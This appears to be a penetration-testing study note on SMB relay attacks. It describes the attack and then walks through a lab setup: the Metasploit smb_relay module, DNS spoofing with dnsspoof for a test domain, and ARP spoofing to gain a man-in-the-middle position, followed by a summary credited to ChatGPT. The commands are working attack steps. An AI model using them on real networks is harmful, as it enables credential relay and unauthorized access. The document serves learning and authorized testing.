# SMB Relay Attack

* An SMB relay attack is a type of network attack where an attacker intercepts SMB (Server Message Block) traffic, manipulates it, and relays it to a legitimate server to gain unauthorized access to resources or perform malicious actions.
* This type of attack is common in Windows networks, where SMB is used for file sharing, printer sharing and other network devices.

## How SMB Relay Attacks Work

* <mark style="color:blue;">Interception:</mark> The attacker sets up a man-in-the-middle position between the client and the server. This can be done using various techniques, such as <mark style="color:green;">ARP spoofing</mark>, <mark style="color:green;">DNS poisoning</mark> or setting up a rogue SMB server.
* <mark style="color:blue;">Capturing Authentications:</mark> When a client connects to a legitimate server via SMB, it sends authentications data. The attacker captures this data, which might include <mark style="color:red;">NTLM</mark> (NT LAN Manager) hashes.
* <mark style="color:blue;">Relaying to a Legitimate Server:</mark> Instead of decrypting the captured NTLM Hash the attacker relays it to another server that trusts the source. This allows the attacker to impersonate the user whose hash was captured.
* <mark style="color:blue;">Gain Access</mark>: If the relay is successful, the attacker can gain access to the resources on the server, which might include sensitive files, databases, or administrative privileges. This access could lead to further lateral movement within the network, compromising additional systems.

## Practice Demo

Use msf module:

Every time the relay module gets a NTLM hash, it  uses them to authenticate and get a meterpreter/shell session on the target (SMBHOST)

* <mark style="color:yellow;">exploit/windows/smb/smb\_relay</mark>

<mark style="color:blue;">What we are doing is pretending that our machine is a SMBServer and the target IP is the host.</mark>

setSRVHOST and LHOST to our IP

Set the SMBHost to the target IP

### Configuring DNS spoofing using DNSspoof

We do this to redirect the victim to our IP every time there is any SMB connection to any host in the domain. The domain is "<mark style="color:red;">sportsfoo.com</mark>"

#### Create a file to simulate the "hosts" file:

* <mark style="color:yellow;">echo "attackerIP \*.sportsfoo.com" > dns</mark>

Now we spoof via our interface <mark style="color:red;">ethernet 1</mark> using the created DNS file.

* <mark style="color:yellow;">dnsspoof -i eth1 -f dns</mark>
  * "<mark style="color:yellow;">-i</mark>": Define interface to listen on
  * "<mark style="color:yellow;">-f</mark>": Define DNS file to use

### Setting up MTM using ARP Spoofing

#### Enable IP forwarding

* <mark style="color:yellow;">echo 1 > /proc/sys/net/ipv4/ip forward</mark>

#### Start the ARP spoof attack against the traffic from Windows 7 to the default gateway:

* <mark style="color:yellow;">arpspoof -i eth1 -t windows7IP gatewayIP</mark>

#### In a new tab:

This command spoofs the traffic from the gateway to the windows7 machine

* <mark style="color:yellow;">arpspoof -i eth1 -t gatewayIP windows7IP</mark>

Now all the trafic of incoming SMB connections gets sent to us.



## ChatGPT Summary of the Attack

In an **SMB Relay Attack**, the goal is to capture SMB authentication requests from a victim and relay them to a target machine within the same network or domain. Here’s a simplified breakdown of the process:

1. **Set Up SMB Relay:**
   * Use the `exploit/windows/smb/smb_relay` module.
   * Set **SRVHOST** and **LHOST** to your IP to make your machine act as an SMB server, and set **SMBHOST** as the target machine where the victim's credentials will be relayed.
2. **DNS Spoofing:**
   * Create a DNS spoofing file with `echo "attackerIP *.sportsfoo.com" > dns` to redirect SMB traffic to your machine.
   * Use `dnsspoof -i eth1 -f dns` to intercept DNS queries and redirect the victim's SMB traffic to your attacking machine.
3. **ARP Spoofing (Man-in-the-Middle):**
   * Enable IP forwarding with `echo 1 > /proc/sys/net/ipv4/ip_forward` to allow traffic to pass through your machine.
   * Run ARP spoofing between the victim (Windows 7 machine) and the gateway using:
     * `arpspoof -i eth1 -t windows7IP gatewayIP` (spoof the victim to the gateway).
     * `arpspoof -i eth1 -t gatewayIP windows7IP` (spoof the gateway to the victim).
4. **Session Management:**

* The `smb_relay` module **does not automatically store sessions** obtained from the relay attack. You will need to manage the sessions manually, but it provides a mechanism to relay the credentials, allowing you to authenticate to the target system once the victim’s credentials are validated.
